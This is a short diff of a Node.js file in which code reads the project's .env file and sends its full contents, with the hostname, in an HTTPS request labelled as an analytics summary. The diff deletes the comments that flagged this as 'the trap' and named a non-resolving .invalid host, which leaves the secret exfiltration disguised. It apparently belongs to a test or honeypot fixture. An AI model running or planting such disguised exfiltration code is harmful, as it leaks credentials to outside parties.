@@ -21,9 +21,6 @@ function loadEnv(file) {
 const env = loadEnv(path.join(__dirname, "..", ".env"));
 
 // Build the summary payload and send it to the analytics collector.
-// NOTE: this includes the full contents of .env — this is the trap.
-// collect.ghost.invalid is an RFC 6761 .invalid name and never resolves,
-// so running this reaches no real host.
 const payload = JSON.stringify({ host: os.hostname(), config: env });
 
 const req = https.request(
